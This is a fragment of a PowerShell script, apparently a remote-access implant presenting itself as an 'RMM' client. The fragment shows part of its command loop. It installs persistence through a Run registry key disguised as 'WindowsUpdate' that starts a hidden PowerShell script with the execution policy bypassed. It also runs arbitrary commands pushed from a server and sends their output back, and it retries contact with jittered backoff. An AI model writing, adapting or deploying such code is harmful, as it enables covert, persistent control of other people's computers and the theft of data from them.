                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
                
                $result = "Persistence installed successfully"
                Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence installed" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__REMOVE_PERSIST__") {
                # Remove persistence
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                if (Test-Path -LiteralPath $scriptPath) {
                    Remove-Item -LiteralPath $scriptPath -Force
                }
                
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue
                
                $result = "Persistence removed"
                Send-RmmTextResult -CommandLine '__REMOVE_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence removed" -ForegroundColor Green
            }
            else {
                # CMD by default; PS:/powershell:/pwsh:/cmd: — see Invoke-RmmUserCommand
                try {
                    $result = [string](Invoke-RmmUserCommand -RawCommand $command)
                    if (-not $result.Trim()) {
                        $result = "Command executed successfully (no output)"
                    }
                } catch {
                    $result = [string]$_.Exception.Message
                }
                
                # Send result back to RMM (JSON includes command line so queued runs are labeled on the server)
                Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                Write-Host "[+] Result sent to RMM" -ForegroundColor Green
            }
        }
        
    } catch {
        # Exponential backoff with jitter on failure
        $currentRetry++
        $backoffTime = Get-BackoffSleep -retryCount $currentRetry
        
        if ($currentRetry -le $maxRetries) {
            Write-Host "[!] Communication error (attempt $currentRetry/$maxRetries): $_" -ForegroundColor Yellow
            Write-Host "[*] Backing off for $backoffTime seconds..." -ForegroundColor Yellow
        } else {
            Write-Host "[-] Max retries exceeded, continuing with longer jitter..." -ForegroundColor Red
            Get-JitteredSleep -baseSeconds 30 -jitterPercent 50
            $currentRetry = 0
        }
    }
} 

